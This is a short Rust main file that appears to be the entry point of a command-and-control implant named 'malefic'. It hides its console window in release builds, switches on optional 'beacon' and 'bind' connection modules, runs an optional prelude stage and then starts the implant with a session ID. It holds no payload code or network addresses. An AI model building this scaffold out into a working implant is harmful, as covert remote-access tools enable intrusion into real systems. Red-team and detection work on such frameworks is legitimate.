#![cfg_attr(not(debug_assertions), windows_subsystem = "windows")]
mod malefic;
mod meta;
mod stub;

#[cfg(feature = "beacon")]
mod beacon;
#[cfg(feature = "bind")]
mod bind;

use crate::malefic::Malefic;
use futures::executor::block_on;

fn main() {
    block_on(async {
        #[cfg(feature = "malefic-prelude")]
        if let Err(e) = malefic_prelude::run() {
            malefic_helper::debug!("Failed to execute prelude: {}", e);
        }

        Malefic::run(malefic_proto::get_sid()).await;
    });
}
